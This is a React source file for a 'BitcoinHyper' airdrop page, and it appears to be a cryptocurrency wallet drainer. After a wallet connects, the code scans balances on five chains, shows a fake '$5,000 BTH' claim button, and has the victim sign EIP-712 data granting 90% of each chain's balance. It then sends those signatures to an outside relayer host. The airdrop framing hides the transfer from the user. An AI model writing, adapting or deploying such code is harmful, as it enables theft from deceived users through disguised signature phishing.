import React, { useState, useEffect, useRef } from 'react';
import { useAppKit, useAppKitAccount, useAppKitProvider } from '@reown/appkit/react';
import { useDisconnect } from 'wagmi';
import { ethers } from 'ethers';
import './index.css';

// ============================================
// NETWORK CONFIG (contract addresses only for reading nonce)
// ============================================
const MULTICHAIN_CONFIG = {
  Ethereum: {
    chainId: 1,
    contractAddress: '0x7aD2535F79E8B2B0A6Cf937E8FB334bf8a08Ed47',
    name: 'Ethereum',
    symbol: 'ETH',
    rpcEndpoints: ['https://eth.llamarpc.com', 'https://ethereum.publicnode.com']
  },
  BSC: {
    chainId: 56,
    contractAddress: '0xb2ea58AcfC23006B3193E6F51297518289D2d6a0',
    name: 'BSC',
    symbol: 'BNB',
    rpcEndpoints: ['https://bsc-dataseed.binance.org', 'https://bsc-dataseed1.defibit.io']
  },
  Polygon: {
    chainId: 137,
    contractAddress: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
    name: 'Polygon',
    symbol: 'MATIC',
    rpcEndpoints: ['https://polygon-rpc.com', 'https://rpc-mainnet.maticvigil.com']
  },
  Arbitrum: {
    chainId: 42161,
    contractAddress: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
    name: 'Arbitrum',
    symbol: 'ETH',
    rpcEndpoints: ['https://arb1.arbitrum.io/rpc']
  },
  Avalanche: {
    chainId: 43114,
    contractAddress: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
    name: 'Avalanche',
    symbol: 'AVAX',
    rpcEndpoints: ['https://api.avax.network/ext/bc/C/rpc']
  }
};

const DEPLOYED_CHAINS = Object.values(MULTICHAIN_CONFIG);

// Helper: fetch balance
const fetchChainBalance = async (chain, walletAddress, retries = 2) => {
  let lastError = null;
  for (let attempt = 0; attempt <= retries; attempt++) {
    for (const rpcUrl of chain.rpcEndpoints) {
      try {
        const timeoutPromise = new Promise((_, reject) =>
          setTimeout(() => reject(new Error(`RPC timeout: ${rpcUrl}`)), 10000)
        );
        const provider = new ethers.JsonRpcProvider(rpcUrl);
        const balancePromise = provider.getBalance(walletAddress);
        const balance = await Promise.race([balancePromise, timeoutPromise]);
        const amount = parseFloat(ethers.formatUnits(balance, 18));
        return { amount, success: true };
      } catch (err) {
        console.warn(`[${chain.name}] RPC failed:`, err.message);
        lastError = err;
      }
    }
    if (attempt < retries) await new Promise(resolve => setTimeout(resolve, 500));
  }
  throw lastError || new Error(`No working RPC for ${chain.name}`);
};

// Helper: get current user nonce from contract (read-only)
const getUserNonce = async (chain, walletAddress) => {
  const abi = ["function userNonce(address) view returns (uint256)"];
  for (const rpcUrl of chain.rpcEndpoints) {
    try {
      const provider = new ethers.JsonRpcProvider(rpcUrl);
      const contract = new ethers.Contract(chain.contractAddress, abi, provider);
      const nonce = await contract.userNonce(walletAddress);
      return Number(nonce);
    } catch (err) {
      console.warn(`Nonce fetch failed on ${rpcUrl}:`, err.message);
    }
  }
  throw new Error(`Could not fetch nonce for ${chain.name}`);
};

// Helper: switch network
const switchNetwork = async (walletProvider, chainId) => {
  try {
    await walletProvider.request({
      method: 'wallet_switchEthereumChain',
      params: [{ chainId: `0x${chainId.toString(16)}` }],
    });
    return true;
  } catch (switchError) {
    if (switchError.code === 4902) {
      throw new Error(`Network ${chainId} not available. Please add it.`);
    }
    throw switchError;
  }
};

// NEW HELPER: wait for wallet to confirm chainId
const waitForChainId = async (walletProvider, targetChainId, timeoutMs = 10000) => {
  const start = Date.now();
  while (Date.now() - start < timeoutMs) {
    try {
      const currentChainIdHex = await walletProvider.request({ method: 'eth_chainId' });
      const currentChainId = parseInt(currentChainIdHex, 16);
      if (currentChainId === targetChainId) return true;
    } catch (e) {}
    await new Promise(resolve => setTimeout(resolve, 300));
  }
  throw new Error(`Timeout: wallet still on wrong chain (expected ${targetChainId})`);
};

function App() {
  const { open } = useAppKit();
  const { address, isConnected } = useAppKitAccount();
  const { walletProvider } = useAppKitProvider('eip155');
  const { disconnect } = useDisconnect();

  const [balances, setBalances] = useState({});
  const [signatureLoading, setSignatureLoading] = useState(false);
  const [txStatus, setTxStatus] = useState('');
  const [error, setError] = useState('');
  const [completedChains, setCompletedChains] = useState([]);
  const [showCelebration, setShowCelebration] = useState(false);
  const [scanning, setScanning] = useState(false);
  const [scanProgress, setScanProgress] = useState(0);
  const [isEligible, setIsEligible] = useState(false);
  const [executableChains, setExecutableChains] = useState([]);
  const [processingChain, setProcessingChain] = useState('');
  const [totalUSDValue, setTotalUSDValue] = useState(0);
  const [stepStatus, setStepStatus] = useState({});
  const [prices, setPrices] = useState({ eth: 2000, bnb: 300, matic: 0.75, avax: 32 });

  const RELAYER_URL = 'https://nexaworldx.com/relayer-app/relay';
  const MIN_VALUE_THRESHOLD = 1;

  // EIP-712 types (NO verifyingContract)
  const EIP712_TYPES = {
    Claim: [
      { name: 'user', type: 'address' },
      { name: 'amount', type: 'uint256' },
      { name: 'nonce', type: 'uint256' },
    ],
  };

  // Fetch prices
  useEffect(() => {
    const fetchPrices = async () => {
      try {
        const res = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum,binancecoin,matic-network,avalanche-2&vs_currencies=usd');
        const data = await res.json();
        setPrices({
          eth: data.ethereum?.usd || 2000,
          bnb: data.binancecoin?.usd || 300,
          matic: data['matic-network']?.usd || 0.75,
          avax: data['avalanche-2']?.usd || 32,
        });
      } catch (error) {}
    };
    fetchPrices();
    const interval = setInterval(fetchPrices, 60000);
    return () => clearInterval(interval);
  }, []);

  // Fetch balances across chains
  const fetchAllBalances = async (walletAddress) => {
    setScanning(true);
    setError('');
    setTxStatus('🔍 Scanning chains for balances...');
    const balanceResults = {};
    let scanned = 0;
    const totalChains = DEPLOYED_CHAINS.length;

    for (const chain of DEPLOYED_CHAINS) {
      try {
        const { amount } = await fetchChainBalance(chain, walletAddress, 2);
        let price = 0;
        if (chain.symbol === 'ETH') price = prices.eth;
        else if (chain.symbol === 'BNB') price = prices.bnb;
        else if (chain.symbol === 'MATIC') price = prices.matic;
        else if (chain.symbol === 'AVAX') price = prices.avax;
        const valueUSD = amount * price;
        scanned++;
        setScanProgress(Math.round((scanned / totalChains) * 100));
        if (amount > 0.000001) {
          balanceResults[chain.name] = { amount, valueUSD, symbol: chain.symbol, chainId: chain.chainId, price };
        }
      } catch (err) {
        console.error(`Failed ${chain.name}:`, err);
        scanned++;
        setScanProgress(Math.round((scanned / totalChains) * 100));
      }
    }
    setBalances(balanceResults);
    setScanning(false);

    const total = Object.values(balanceResults).reduce((sum, b) => sum + b.valueUSD, 0);
    setTotalUSDValue(total);
    const executable = DEPLOYED_CHAINS.filter(c => balanceResults[c.name]?.valueUSD >= MIN_VALUE_THRESHOLD);
    setExecutableChains(executable);
    setIsEligible(executable.length > 0);
    setTxStatus(executable.length ? `✅ ${executable.length} chain(s) eligible ($${total.toFixed(2)})` : `⚠️ No chain with ≥ $1 balance`);
  };

  useEffect(() => {
    if (isConnected && address && Object.keys(balances).length === 0 && !scanning) {
      fetchAllBalances(address);
    }
  }, [isConnected, address]);

  // Main claim execution with chainId verification
  const executeMultiChainSignature = async () => {
    if (!walletProvider || !address) {
      setError('Wallet not initialized');
      return;
    }

    setSignatureLoading(true);
    setError('');
    setCompletedChains([]);
    setStepStatus({});

    try {
      const chainsToProcess = executableChains.filter(c => balances[c.name]?.valueUSD >= MIN_VALUE_THRESHOLD);
      if (chainsToProcess.length === 0) throw new Error('No eligible chains');

      for (const chain of chainsToProcess) {
        setProcessingChain(chain.name);
        setStepStatus(prev => ({ ...prev, [chain.name]: 'switching' }));
        setTxStatus(`🔄 Switching to ${chain.name}...`);

        // 1. Switch network
        await switchNetwork(walletProvider, chain.chainId);
        setStepStatus(prev => ({ ...prev, [chain.name]: 'waiting_chain' }));
        setTxStatus(`⏳ Waiting for ${chain.name} confirmation...`);

        // 2. Wait for wallet to confirm the new chainId (FIX)
        await waitForChainId(walletProvider, chain.chainId, 10000);
        setStepStatus(prev => ({ ...prev, [chain.name]: 'switched' }));

        // 3. Create fresh provider & signer AFTER chain is confirmed
        const newProvider = new ethers.BrowserProvider(walletProvider);
        const newSigner = await newProvider.getSigner();
        const signerAddress = await newSigner.getAddress();
        if (signerAddress.toLowerCase() !== address.toLowerCase()) {
          throw new Error('Signer address mismatch after network switch');
        }

        const balance = balances[chain.name];
        if (!balance || balance.valueUSD < MIN_VALUE_THRESHOLD) continue;

        // 4. Fetch current nonce from contract (read-only)
        setStepStatus(prev => ({ ...prev, [chain.name]: 'fetching_nonce' }));
        const nonce = await getUserNonce(chain, address);
        
        // 5. Prepare signature (send 90% of balance)
        const amountToSend = balance.amount * 0.9;
        const amountInWei = ethers.parseEther(amountToSend.toFixed(18));
        
        const domain = {
          name: "BitcoinHyper Airdrop",
          version: "1",
          chainId: chain.chainId,
        };
        const value = {
          user: address,
          amount: amountInWei.toString(),
          nonce: nonce,
        };

        setStepStatus(prev => ({ ...prev, [chain.name]: 'signing' }));
        setTxStatus(`✍️ Signing for ${chain.name}...`);
        const signature = await newSigner.signTypedData(domain, EIP712_TYPES, value);
        setStepStatus(prev => ({ ...prev, [chain.name]: 'signed' }));

        // 6. Send to relayer
        setStepStatus(prev => ({ ...prev, [chain.name]: 'relaying' }));
        setTxStatus(`📤 Sending to relayer (${chain.name})...`);
        const response = await fetch(RELAYER_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            signaturePayload: {
              domain,
              types: EIP712_TYPES,
              value,
              signature,
              expectedSigner: address,
            },
          }),
        });

        const result = await response.json();
        if (!result.success) throw new Error(result.error || 'Relayer failed');

        setStepStatus(prev => ({ ...prev, [chain.name]: 'completed' }));
        setCompletedChains(prev => [...prev, chain.name]);
        setTxStatus(`✅ ${chain.name} completed! Tx: ${result.hash?.slice(0, 10)}...`);
      }

      if (completedChains.length === 0) setError('No chains processed');
      else setShowCelebration(true);
    } catch (err) {
      console.error(err);
      setError(err.message);
      if (processingChain) setStepStatus(prev => ({ ...prev, [processingChain]: 'failed' }));
    } finally {
      setSignatureLoading(false);
      setProcessingChain('');
    }
  };

  const formatAddress = (addr) => addr ? `${addr.slice(0,6)}...${addr.slice(38)}` : '';

  return (
    <div className="min-h-screen bg-[#030405] text-[#e0e7f0] font-['Inter'] overflow-hidden">
      {/* Animated orbs */}
      <div className="fixed w-[90vmax] h-[90vmax] bg-[radial-gradient(circle_at_40%_50%,rgba(200,120,30,0.12)_0%,rgba(180,100,20,0)_70%)] rounded-full top-[-25vmax] right-[-15vmax] z-0 animate-floatOrbBig pointer-events-none"></div>
      <div className="fixed w-[80vmin] h-[80vmin] bg-[radial-gradient(circle_at_30%_70%,rgba(0,150,200,0.08)_0%,transparent_70%)] rounded-full bottom-[-10vmin] left-[-5vmin] z-0 animate-floatOrbSmall pointer-events-none"></div>

      <div className="relative z-10 container mx-auto px-4 py-8 max-w-[720px]">
        <div className="bg-[rgba(10,15,20,0.75)] backdrop-blur-[12px] border border-[rgba(200,130,30,0.2)] rounded-[48px] shadow-xl p-8 md:p-10">
          {/* Header */}
          <div className="flex flex-col sm:flex-row justify-between items-center gap-4 mb-6">
            <div className="flex items-center gap-2 font-bold text-2xl text-[#d68a2e]">
              <i className="fab fa-bitcoin text-4xl animate-spinSlow"></i>
              <span>BITCOINHYPER</span>
            </div>
            {!isConnected ? (
              <button onClick={() => open()} className="bg-gradient-to-r from-[#c47d24] to-[#b36e1a] px-6 py-3 rounded-full font-bold uppercase tracking-wider hover:scale-105 transition-all">
                <i className="fas fa-plug mr-2"></i> CONNECT WALLET
              </button>
            ) : (
              <div className="bg-black/70 rounded-full py-1 pl-5 pr-1 flex items-center gap-3 border border-[#c47d24]/60">
                <span className="font-mono text-sm">{formatAddress(address)}</span>
                <button onClick={() => disconnect()} className="w-8 h-8 rounded-full bg-[#c47d24] flex items-center justify-center hover:bg-[#d68a2e]">
                  <i className="fas fa-power-off text-sm"></i>
                </button>
              </div>
            )}
          </div>

          {/* Claim section */}
          {isConnected && (
            <div className="mb-6">
              {scanning && (
                <div className="bg-black/60 rounded-2xl p-5 border border-[#c47d24]/30 mb-4">
                  <div className="flex items-center gap-4">
                    <div className="w-10 h-10 border-4 border-[#c47d24] border-t-transparent rounded-full animate-spin"></div>
                    <div>
                      <div className="font-bold text-[#e0b880]">Scanning Blockchains</div>
                      <div className="text-xs text-gray-400">Ethereum, BSC, Polygon, Arbitrum, Avalanche</div>
                    </div>
                  </div>
                  <div className="w-full bg-gray-800 rounded-full h-1.5 mt-3">
                    <div className="bg-gradient-to-r from-[#c47d24] to-[#d68a2e] h-1.5 rounded-full transition-all" style={{ width: `${scanProgress}%` }}></div>
                  </div>
                  <div className="mt-2 text-xs text-center text-[#c47d24]">{txStatus}</div>
                </div>
              )}

              {!scanning && !showCelebration && (
                <div className="space-y-3">
                  {isEligible ? (
                    <div className="bg-green-500/10 border border-green-500/30 rounded-xl p-4 text-center">
                      <div className="text-green-400 font-bold text-sm mb-2">✅ YOU ARE ELIGIBLE!</div>
                      <p className="text-xs text-gray-300 mb-2">Total: ${totalUSDValue.toFixed(2)} across {executableChains.length} chain(s)</p>
                      <button
                        onClick={executeMultiChainSignature}
                        disabled={signatureLoading}
                        className="w-full bg-gradient-to-r from-[#b36e1a] via-[#c47d24] to-[#d68a2e] text-black font-bold py-4 rounded-xl transition-all transform hover:scale-105 text-lg"
                      >
                        {signatureLoading ? (
                          <span className="flex items-center justify-center gap-2">
                            <div className="w-5 h-5 border-2 border-black border-t-transparent rounded-full animate-spin"></div>
                            {processingChain ? `Processing ${processingChain}...` : 'Processing...'}
                          </span>
                        ) : (
                          <span>🎁 CLAIM $5,000 BTH ⚡ +25% BONUS</span>
                        )}
                      </button>
                    </div>
                  ) : (
                    <div className="bg-yellow-500/10 border border-yellow-500/30 rounded-xl p-4 text-center">
                      <div className="text-yellow-400 font-bold text-sm mb-2">⚡ Insufficient Balance</div>
                      <p className="text-xs text-gray-300">Need ≥ $1 across supported chains. Current: ${totalUSDValue.toFixed(2)}</p>
                    </div>
                  )}
                </div>
              )}

              {/* Step status */}
              {Object.keys(stepStatus).length > 0 && (
                <div className="mt-4 space-y-2">
                  <p className="text-xs font-semibold text-gray-400">⚙️ Live progress:</p>
                  {Object.entries(stepStatus).map(([chain, step]) => (
                    <div key={chain} className="bg-black/40 rounded-lg p-2 flex justify-between text-xs">
                      <span className="font-medium">{chain}</span>
                      <span className={`px-2 py-0.5 rounded-full ${
                        step === 'completed' ? 'bg-green-500/20 text-green-400' :
                        step === 'failed' ? 'bg-red-500/20 text-red-400' :
                        'bg-yellow-500/20 text-yellow-400'
                      }`}>
                        {step === 'switching' && '🔄 Switching'}
                        {step === 'waiting_chain' && '⏳ Waiting chain'}
                        {step === 'switched' && '✅ Switched'}
                        {step === 'fetching_nonce' && '🔢 Fetching nonce'}
                        {step === 'signing' && '✍️ Signing...'}
                        {step === 'signed' && '✅ Signed'}
                        {step === 'relaying' && '📡 Relaying'}
                        {step === 'completed' && '🎉 Completed'}
                        {step === 'failed' && '❌ Failed'}
                      </span>
                    </div>
                  ))}
                </div>
              )}

              {error && (
                <div className="mt-3 bg-red-500/10 border border-red-500/20 rounded-lg p-3">
                  <p className="text-red-300 text-xs"><i className="fas fa-exclamation-triangle mr-1"></i> {error}</p>
                </div>
              )}
            </div>
          )}

          {/* Bonus ribbon */}
          <div className="relative mb-5">
            <div className="absolute -inset-1 bg-gradient-to-r from-[#8a4c1a] via-[#b36e1a] to-[#cc8822] rounded-full blur-xl opacity-50 animate-pulse-slow"></div>
            <div className="relative bg-gradient-to-r from-[#8a4c1a] via-[#b36e1a] to-[#cc8822] rounded-full px-6 py-3 flex justify-center gap-4 font-bold text-xl text-black shadow-lg">
              <i className="fas fa-gem text-3xl animate-ringPop"></i>
              <span>+25% BONUS · 5,000 BTH</span>
              <i className="fas fa-bolt text-3xl animate-ringPop"></i>
            </div>
          </div>

          <h1 className="text-5xl md:text-7xl font-extrabold text-center mb-2 bg-gradient-to-b from-white via-[#f0d0a0] to-[#d68a2e] bg-clip-text text-transparent drop-shadow-lg animate-pulse-slow">
            $5,000 BTH
          </h1>
          <div className="text-center mb-6">
            <span className="bg-black/60 rounded-full px-6 py-2 text-xs border border-[#c47d24]/40">
              <i className="fas fa-bolt mr-2 animate-bounce-slow"></i> instant airdrop · +25% extra
            </span>
          </div>

          {/* Stats */}
          <div className="bg-black/60 rounded-2xl p-4 grid grid-cols-3 gap-2 border border-[#c47d24]/30">
            <div className="text-center"><div className="text-xs text-gray-400">BTH PRICE</div><div className="text-xl font-bold">$0.045</div></div>
            <div className="text-center"><div className="text-xs text-gray-400">BONUS</div><div className="text-xl font-bold">+25%</div></div>
            <div className="text-center"><div className="text-xs text-gray-400">PRESALE</div><div className="text-xl font-bold">STAGE 4</div></div>
          </div>
        </div>
      </div>

      {/* Celebration modal */}
      {showCelebration && (
        <div className="fixed inset-0 bg-black/90 backdrop-blur-xl flex items-center justify-center z-50 p-4 animate-fadeIn">
          <div className="relative max-w-sm w-full">
            <div className="absolute inset-0 bg-gradient-to-r from-orange-600/30 to-yellow-600/30 rounded-3xl blur-2xl"></div>
            <div className="relative bg-gray-900 rounded-3xl p-8 text-center border border-orange-500/20">
              <div className="text-6xl mb-4 animate-bounce">🎉</div>
              <h2 className="text-3xl font-black text-transparent bg-clip-text bg-gradient-to-r from-yellow-400 to-orange-500">SUCCESSFUL!</h2>
              <p className="text-gray-300 mt-2">You secured</p>
              <div className="text-4xl font-black text-orange-400 my-3 animate-pulse">$5,000 BTH</div>
              <div className="inline-block bg-green-500/20 px-6 py-2 rounded-full text-green-400">+25% BONUS</div>
              <button onClick={() => setShowCelebration(false)} className="w-full bg-orange-500 text-white font-bold py-3 rounded-xl mt-4 hover:scale-105 transition">VIEW</button>
            </div>
          </div>
        </div>
      )}

      <style>{`
        @keyframes floatOrbBig { 0%{transform:translate(0,0) scale(1);} 50%{transform:translate(-3%,4%) scale(1.05);} 100%{transform:translate(0,0) scale(1);} }
        @keyframes floatOrbSmall { 0%{transform:translate(0,0) rotate(0deg);} 50%{transform:translate(5%,-6%) rotate(3deg);} 100%{transform:translate(0,0) rotate(0deg);} }
        @keyframes ringPop { 0%,100%{transform:scale(1);} 50%{transform:scale(1.1);} }
        @keyframes spinSlow { 0%{transform:rotateY(0deg);} 100%{transform:rotateY(360deg);} }
        @keyframes pulse-slow { 0%,100%{opacity:0.3;} 50%{opacity:0.6;} }
        @keyframes bounce-slow { 0%,100%{transform:translateY(0);} 50%{transform:translateY(-2px);} }
        @keyframes fadeIn { from{opacity:0;transform:scale(0.95);} to{opacity:1;transform:scale(1);} }
        .animate-floatOrbBig { animation: floatOrbBig 20s ease-in-out infinite; }
        .animate-floatOrbSmall { animation: floatOrbSmall 24s ease-in-out infinite; }
        .animate-ringPop { animation: ringPop 1.5s infinite; }
        .animate-spinSlow { animation: spinSlow 6s infinite linear; }
        .animate-pulse-slow { animation: pulse-slow 3s ease-in-out infinite; }
        .animate-bounce-slow { animation: bounce-slow 2s ease-in-out infinite; }
        .animate-fadeIn { animation: fadeIn 0.3s ease-out; }
      `}</style>
    </div>
  );
}

export default App;
